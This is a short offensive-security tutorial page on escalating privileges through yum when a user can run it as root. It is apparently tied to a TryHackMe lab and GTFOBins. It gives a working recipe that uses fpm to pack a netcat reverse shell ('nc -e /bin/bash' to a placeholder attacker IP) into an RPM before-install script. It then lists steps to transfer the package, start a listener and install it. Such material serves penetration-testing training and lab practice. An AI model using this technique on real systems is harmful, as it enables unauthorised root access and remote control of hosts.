<h1 id="Exploiting-Yum"><a href="#Exploiting-Yum" class="headerlink" title="Exploiting Yum"></a>Exploiting Yum</h1><p>Further examples around yum can also be found on <a href="https://gtfobins.github.io/gtfobins/yum/" target="_blank" rel="noopener">gtfobins</a>.</p>
<h2 id="Executing-arbitrary-commands-via-RPM-Packages"><a href="#Executing-arbitrary-commands-via-RPM-Packages" class="headerlink" title="Executing arbitrary commands via RPM Packages"></a>Executing arbitrary commands via RPM Packages</h2><h3 id="Checking-the-Environment"><a href="#Checking-the-Environment" class="headerlink" title="Checking the Environment"></a>Checking the Environment</h3><p>In order to leverage this vector the user must be able to execute yum commands as a higher privileged user, i.e. root.</p>
<h4 id="A-working-example-of-this-vector"><a href="#A-working-example-of-this-vector" class="headerlink" title="A working example of this vector"></a>A working example of this vector</h4><p>A working example of this exploit can be found in the <a href="https://tryhackme.com/room/dailybugle" target="_blank" rel="noopener">daily bugle</a> room on <a href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme</a>.</p>
<h3 id="Packing-an-RPM"><a href="#Packing-an-RPM" class="headerlink" title="Packing an RPM"></a>Packing an RPM</h3><p>In the following section, I will cover packaging a reverse shell into an RPM using <a href="https://github.com/jordansissel/fpm" target="_blank" rel="noopener">fpm</a>.</p>
<p>The example below creates a package that includes a before-install trigger with an arbitrary script that can be defined by the attacker. When installed, this package will execute the arbitrary command. Iâ€™ve used a simple reverse netcat shell example for demonstration but this can be changed as necessary.</p>
<pre><code class="text">EXPLOITDIR=$(mktemp -d)
CMD=&#39;nc -e /bin/bash &lt;ATTACKER IP&gt; &lt;PORT&gt;&#39;
RPMNAME=&quot;exploited&quot;
echo $CMD &gt; $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
</code></pre>
<h2 id="Catching-a-shell"><a href="#Catching-a-shell" class="headerlink" title="Catching a shell"></a>Catching a shell</h2><p>Using the above example and assuming <code>yum</code> can be executed as a higher-privileged user.</p>
<ol>
<li><strong>Transfer</strong> the rpm to the host</li>
<li><strong>Start</strong> a listener on your local host such as the <a href="/shells/shells/linux#netcat">example netcat listener</a></li>
<li><strong>Install</strong> the vulnerable package <code>yum localinstall -y exploited-1.0-1.noarch.rpm</code></li>
</ol>
